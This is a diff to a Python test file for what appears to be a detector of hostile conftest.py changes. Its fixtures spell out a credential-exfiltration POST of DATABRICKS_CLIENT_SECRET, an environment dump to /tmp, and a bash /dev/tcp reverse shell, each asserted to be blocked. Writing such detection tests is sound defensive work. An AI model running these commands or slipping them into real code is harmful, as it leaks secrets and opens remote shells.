@@ -82,7 +82,7 @@ def test_secret_source_plus_network_blocks(tmp_path: Path) -> None:
             "tests/e2e/conftest.py",
             [
                 "import requests, os",
-                "requests.post('http://evil.example', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
+                "requests.post('http://x', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
             ],
         ),
     )
@@ -111,14 +111,23 @@ def test_environ_dump_blocks(tmp_path: Path) -> None:
     """
     out = _run(
         tmp_path,
-        _diff("tests/conftest.py", ["import json, os", "open('/tmp/x','w').write(json.dumps(os.environ))"]),
+        _diff(
+            "tests/conftest.py",
+            ["import json, os", "open('/tmp/x','w').write(json.dumps(os.environ))"],
+        ),
     )
     assert out["clean"] == "false"
 
 
 def test_reverse_shell_blocks(tmp_path: Path) -> None:
     """A /dev/tcp reverse-shell shape blocks. Asserts ``clean=false``."""
-    out = _run(tmp_path, _diff("tests/conftest.py", ["import os", "os.system('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1')"]))
+    out = _run(
+        tmp_path,
+        _diff(
+            "tests/conftest.py",
+            ["import os", "os.system('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1')"],
+        ),
+    )
     assert out["clean"] == "false"
 
 
